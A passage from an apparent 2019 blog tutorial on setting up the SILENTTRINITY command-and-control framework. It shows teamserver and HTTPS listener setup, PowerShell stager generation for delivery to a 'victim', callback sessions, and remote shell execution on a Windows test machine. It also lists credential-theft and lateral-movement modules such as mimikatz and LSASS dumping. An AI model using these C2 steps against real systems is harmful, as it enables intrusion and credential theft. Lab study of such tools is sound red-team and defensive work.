</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> RegenCert   <span style="color:#960050;background-color:#1e0010">│</span> False    <span style="color:#960050;background-color:#1e0010">│</span> False         <span style="color:#960050;background-color:#1e0010">│</span> Regenerate TLS cert               <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Comms       <span style="color:#960050;background-color:#1e0010">│</span> True     <span style="color:#960050;background-color:#1e0010">│</span> https         <span style="color:#960050;background-color:#1e0010">│</span> C2 Comms to <span style="color:#66d9ef">use</span>                   <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─────────────┴──────────┴───────────────┴───────────────────────────────────┘</span>
</span></span></code></pre></div><center>
<figcaption>
<center>Configuring Listener Options</center>
</figcaption>
</center>
<p>And finally to start the listener you simply do <code>start</code>. To see what listeners are running you can also use <code>list</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST (listeners)(https) <span style="color:#960050;background-color:#1e0010">≫</span> start                                                                                     
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST (listeners)(https) <span style="color:#960050;background-color:#1e0010">≫</span> list                                                                                      
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌</span>Running<span style="color:#960050;background-color:#1e0010">┬──────────────────────────┐</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Name  <span style="color:#960050;background-color:#1e0010">│</span> URL                      <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├───────┼──────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> https <span style="color:#960050;background-color:#1e0010">│</span> https:<span style="color:#f92672">//</span><span style="color:#ae81ff">172.30.5.18</span>:<span style="color:#ae81ff">8080</span> <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└───────┴──────────────────────────┘</span>
</span></span></code></pre></div><center>
<figcaption>
<center>Starting Listener</center>
</figcaption>
</center>
<p style="text-align:justify;">
Got all that? Cool, next you'll have to set up the stager. For this example I chose to go with a powershell stager. To do so use the <code>stagers</code> command. Then <code>use powershell</code> to specify that you want to use the powershell stager. When you generate the stager be sure to specify what listener this stager will call back to. Earlier, when I used <code>list</code> to list the listeners I had running it stated the name of the listener which was "https".</p>  
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>listeners<span style="color:#f92672">)(</span>https<span style="color:#f92672">)</span> ≫ stagers                                     
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)</span> ≫list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌Available───┬───────────────────────────────────────┐
</span></span><span style="display:flex;"><span>│ Name       │ Description                           │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ msbuild    │ Stage via MSBuild XML inline C# task  │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ powershell │ Stage via a PowerShell script         │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ wmic       │ Stage via wmic XSL execution          │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ dll        │ Generates a windows dll stager        │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ exe        │ Generates a windows executable stager │
</span></span><span style="display:flex;"><span>└────────────┴───────────────────────────────────────┘
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)</span> ≫ use powershell
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)(</span>powershell<span style="color:#f92672">)</span> ≫list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌Available───┬───────────────────────────────────────┐
</span></span><span style="display:flex;"><span>│ Name       │ Description                           │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ msbuild    │ Stage via MSBuild XML inline C# task  │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ powershell │ Stage via a PowerShell script         │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ wmic       │ Stage via wmic XSL execution          │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ dll        │ Generates a windows dll stager        │
</span></span><span style="display:flex;"><span>├────────────┼───────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ exe        │ Generates a windows executable stager │
</span></span><span style="display:flex;"><span>└────────────┴───────────────────────────────────────┘
</span></span></code></pre></div><center>
<figcaption>
<center>Configuring Stager</center>
</figcaption>
</center>
<p style="text-align:justify;">
If you successfully generate the stager it will produce a file in your local directory for you to deliver to your victim. For demo purposes I just dragged and dropped the ps1 file onto my Windows test machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clutchisback1@HOMEPC /e/g/SILENTTRINITY $ ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CONTRIBUTING.md  data/    NOTES.md  Pipfile.lock  STAGER.PS1  st.py   TODO.md
</span></span><span style="display:flex;"><span>core/            LICENSE  Pipfile   README.md     stager.xml  teamserver.py
</span></span></code></pre></div><center>
<figcaption>
<center>Stager File</center>
</figcaption>
</center>
<center>
<figure>
<img src="../../images/Silent Trinity/9.png" alt="Executing Stager File" />
<figcaption>
<center>Executing Stager File</center>
</figcaption>
</figure>
</center>
<p style="text-align:justify;">
Once you execute the stager you'll get that good ol' connect back and be ready to play with some of the <code>modules</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)(</span>powershell<span style="color:#f92672">)</span> ≫ generate https                                                                         
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generated stager to ./stager.ps1
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">535569</span> bytes<span style="color:#f92672">)</span> -&gt;  192.168.1.19 ...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> New session 0543be83-e37f-4f84-a019-78993d71227e connected! <span style="color:#f92672">(</span>192.168.1.19<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)(</span>powershell<span style="color:#f92672">)</span> ≫ sessions                                                                               
</span></span></code></pre></div><center>
<figcaption>
<center>Connect Back</center>
</figcaption>
</center>
<p>In case you want to check what sessions you have you can use the <code>sessions</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>sessions<span style="color:#f92672">)</span> ≫list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌Sessions──────────────────────────────┬────────────────────────────┬──────────────┬────────────────┐
</span></span><span style="display:flex;"><span>│ Name                                 │ User                       │ Address      │ Last Checkin   │
</span></span><span style="display:flex;"><span>├──────────────────────────────────────┼────────────────────────────┼──────────────┼────────────────┤
</span></span><span style="display:flex;"><span>│ 0543be83-e37f-4f84-a019-78993d71227e │ Clutchisback1@HOMEPC       │ 192.168.1.19 │ h <span style="color:#ae81ff">00</span> m <span style="color:#ae81ff">00</span> s <span style="color:#ae81ff">13</span> │
</span></span><span style="display:flex;"><span>└──────────────────────────────────────┴────────────────────────────┴──────────────┴────────────────┘
</span></span></code></pre></div><center>
<figcaption>
<center>Sessions List</center>
</figcaption>
</center>
<p>To start messing around with the modules use the <code>modules</code> command. If you want to see what all is available use <code>list</code> like I did here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>sessions<span style="color:#f92672">)</span> ≫ modules
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)</span> ≫ list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌Modules────────────────┬───────────────────────────────────────────────────────────────────────────┐
</span></span><span style="display:flex;"><span>│ Name                  │ Description                                                               │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/wmi               │ Move laterally using wmi                                                  │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/msgbox            │ Pop a message box                                                         │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/execute-assembly  │ Execute a .NET assembly in memory                                         │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/mouseshaker       │ Shakes da mouse                                                           │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/powershell        │ Execute arbitrary PowerShell in an un-managed runspace                    │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/excelshellinject  │ Executes arbitrary shellcode using Excel COM objects                      │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/mimikatz          │ Loads Mimikatz in memory and executes the specified command               │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/shellcode         │ Injects shellcode using the specified technique                           │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/shell             │ Runs a shell command                                                      │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/internalmonologue │ Executes the Internal Monologue attack.                                   │
</span></span><span style="display:flex;"><span>│                       │ If admin, this will give you the Net-NTLMv1 hashes of all logged on users │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/winrm             │ Move laterally using winrm                                                │
</span></span><span style="display:flex;"><span>├───────────────────────┼───────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ boo/minidump          │ Creates a memorydump of LSASS via Native Win32 API Calls                  │
</span></span><span style="display:flex;"><span>└───────────────────────┴───────────────────────────────────────────────────────────────────────────┘
</span></span></code></pre></div><center>
<figcaption>
<center>Modules List</center>
</figcaption>
</center>
<p>For demonstration purposes I ran a simple shell command. You can follow along and use these steps to configure modules on your end:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)</span> ≫ use boo/shell
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)(</span>boo/shell<span style="color:#f92672">)</span> ≫ options                                                                                                                                                                                                         
</span></span><span style="display:flex;"><span>┌boo/shell────┬──────────┬─────────────────────────┬───────────────────────────────────────────────────────────────────────────────┐
</span></span><span style="display:flex;"><span>│ Option Name │ Required │ Value                   │ Description                                                                   │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Command     │ True     │                         │ The ShellCommand to execute, including any arguments                          │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Path        │ False    │ C:<span style="color:#ae81ff">\\</span>WINDOWS<span style="color:#ae81ff">\\</span>System32<span style="color:#ae81ff">\\</span> │ The Path of the directory from which to execute the ShellCommand              │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Username    │ False    │                         │ Optional alternative username to execute ShellCommand as                      │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Domain      │ False    │                         │ Optional alternative Domain of the username to execute ShellCommand as        │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Password    │ False    │                         │ Optional password to authenticate the username to execute the ShellCommand as │
</span></span><span style="display:flex;"><span>└─────────────┴──────────┴─────────────────────────┴───────────────────────────────────────────────────────────────────────────────┘
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)(</span>boo/shell<span style="color:#f92672">)</span> ≫ set command whoami                                                                                                                                                                                              
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)(</span>boo/shell<span style="color:#f92672">)</span> ≫ options                                                                                                                                                                                                         
</span></span><span style="display:flex;"><span>┌boo/shell────┬──────────┬─────────────────────────┬───────────────────────────────────────────────────────────────────────────────┐
</span></span><span style="display:flex;"><span>│ Option Name │ Required │ Value                   │ Description                                                                   │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Command     │ True     │ whoami                  │ The ShellCommand to execute, including any arguments                          │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Path        │ False    │ C:<span style="color:#ae81ff">\\</span>WINDOWS<span style="color:#ae81ff">\\</span>System32<span style="color:#ae81ff">\\</span> │ The Path of the directory from which to execute the ShellCommand              │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Username    │ False    │                         │ Optional alternative username to execute ShellCommand as                      │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Domain      │ False    │                         │ Optional alternative Domain of the username to execute ShellCommand as        │
</span></span><span style="display:flex;"><span>├─────────────┼──────────┼─────────────────────────┼───────────────────────────────────────────────────────────────────────────────┤
</span></span><span style="display:flex;"><span>│ Password    │ False    │                         │ Optional password to authenticate the username to execute the ShellCommand as │
</span></span><span style="display:flex;"><span>└─────────────┴──────────┴─────────────────────────┴───────────────────────────────────────────────────────────────────────────────┘
</span></span></code></pre></div><center>
<figcaption>
<center>Module Configuration</center>
</figcaption>
</center>
<p>When you run the command you&rsquo;ll have to specify the session name. So it&rsquo;ll be <code>run SESSIONNAME</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)(</span>boo/shell<span style="color:#f92672">)</span> ≫ run 7da8c16b-bc99-4487-b160-25bd54f8d4d2                                                
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">535569</span> bytes<span style="color:#f92672">)</span> -&gt;  192.168.1.19 ...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> New session a6d7fef8-70d1-46ab-90c0-2e2d5a97c308 connected! <span style="color:#f92672">(</span>192.168.1.19<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)(</span>boo/shell<span style="color:#f92672">)</span> ≫ run a6d7fef8-70d1-46ab-90c0-2e2d5a97c308                                                
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> a6d7fef8-70d1-46ab-90c0-2e2d5a97c308 returned job result <span style="color:#f92672">(</span>id: xNr49mEAu7<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Path: C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\ </span>Command: whoami Args:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOMEPC<span style="color:#ae81ff">\c</span>lutchisback1
</span></span></code></pre></div><center>
<figcaption>
<center>Running Module</center>
</figcaption>
</center>
<h3 id="conclusions----tldrers-end-here-">
  Conclusions  &ndash;TLDRers End Here ⤴
  <a href="#conclusions----tldrers-end-here-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p style="text-align:justify;">
I hope that helps you all get started at least. So far this has been a great C2 that works well against Windows 10. Once you get used to the auto-complete feature and can get your listener up and running you should be pretty good on getting a stager together and getting a session. I'd say most of my time was spent fooling around with dag on pipenv and python dependencies. I actually tried to start the pipenv using sudo...Yea no...Didn't work so well for me. That's when I figured just to change the port to something higher and that seemed to work out fine.</p>
<h3 id="terminal-">
  Terminal 💾
  <a href="#terminal-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Setting up Server</span>
</span></span><span style="display:flex;"><span>python3 teamserver.py 172.30.5.18 beefhooks
</span></span><span style="display:flex;"><span>python3 st.py wss://test:beefhooks@192.168.1.19:5000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Setting Listeners</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST ≫ listeners                       
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>listeners<span style="color:#f92672">)</span> ≫ use https
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>listeners<span style="color:#f92672">)(</span>https<span style="color:#f92672">)</span> ≫ set port <span style="color:#ae81ff">8080</span>                                      
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>listeners<span style="color:#f92672">)(</span>https<span style="color:#f92672">)</span> ≫ start           
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Setting Stager                                   </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>listeners<span style="color:#f92672">)(</span>https<span style="color:#f92672">)</span> ≫ stagers                                                        
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)</span> ≫ list
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)</span> ≫ use powershell
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)(</span>powershell<span style="color:#f92672">)</span> ≫ options
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)(</span>powershell<span style="color:#f92672">)</span> ≫ generate https
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generated stager to ./stager.ps1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#sample connection back</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">535569</span> bytes<span style="color:#f92672">)</span> -&gt;  192.168.1.19 ...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TS-KM5Wj<span style="color:#f92672">]</span> New session 0543be83-e37f-4f84-a019-78993d71227e connected! <span style="color:#f92672">(</span>192.168.1.19<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Sessions</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>stagers<span style="color:#f92672">)(</span>powershell<span style="color:#f92672">)</span> ≫ sessions                                                                               
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>sessions<span style="color:#f92672">)</span> ≫ list                                                                                              
</span></span><span style="display:flex;"><span>┌Sessions──────────────────────────────┬────────────────────────────┬──────────────┬────────────────┐
</span></span><span style="display:flex;"><span>│ Name                                 │ User                       │ Address      │ Last Checkin   │
</span></span><span style="display:flex;"><span>├──────────────────────────────────────┼────────────────────────────┼──────────────┼────────────────┤
</span></span><span style="display:flex;"><span>│ 0543be83-e37f-4f84-a019-78993d71227e │ Clutchisback1@HOMEPC-WIN   │ 192.168.1.19 │ h <span style="color:#ae81ff">00</span> m <span style="color:#ae81ff">00</span> s <span style="color:#ae81ff">13</span> │
</span></span><span style="display:flex;"><span>└──────────────────────────────────────┴────────────────────────────┴──────────────┴────────────────┘
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Modules</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>sessions<span style="color:#f92672">)</span> ≫ modules
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)</span> ≫ list
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)</span> ≫ use boo/shell
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> ST <span style="color:#f92672">(</span>modules<span style="color:#f92672">)(</span>boo/shell<span style="color:#f92672">)</span> ≫ run a6d7fef8-70d1-46ab-90c0-2e2d5a97c308                                                
</span></span></code></pre></div><p><br><br></p>
<h1 id="pitfalls-to-avoid-">
  Pitfalls To Avoid 😨
  <a href="#pitfalls-to-avoid-" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h4 id="listeners">
  Listeners?
  <a href="#listeners" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p style="text-align:justify;">
If you start Silent Trinity and try to navigate to the "listeners" but nothing happens, you probably have an issue with connecting to your teamserver that you set up initially. Make sure you're using the right password and stuff like that.</p>
<h4 id="bad-ports">
  Bad Ports?
  <a href="#bad-ports" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p style="text-align:justify;">
Also if you try to use a stager on a port lower than 1000 and you did NOT run pipenv with a root account it won't work. The error is also pretty subtle but you should see some details in the terminal where your teamserver is running. Look for something saying "permission denied" if you really want closure on why your listener won't work.</p>
<h4 id="mimikatz">
  Mimikatz?
  <a href="#mimikatz" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p style="text-align:justify;">
I also haven't gotten mimikatz to work on my test rig yet but my dude TheTalilama did and said that it needs to be exec'ed in a elevated prompt to appease all the UAC stuff so make sure you do that if you're playing with some of the modules.</p>
<hr>
<center>
```python
__________________
< Bl3$$3d Tr1n1ty! >
------------------
 \            .    .     .   
  \      .  . .     `  ,     
   \    .; .  : .' :  :  : .
    \   i..`: i` i.i.,i  i .
     \   `,--.|i |i|ii|ii|i:
          UooU\.'@@@@@@`.||'
          \__/(@@@@@@@@@@)'  
               (@@@@@@@@)    
               `YY~~~~YY'    
                ||    ||  
```
</center>

    </div>
    

    
      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">Copyright 2019 😜</div>
      
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
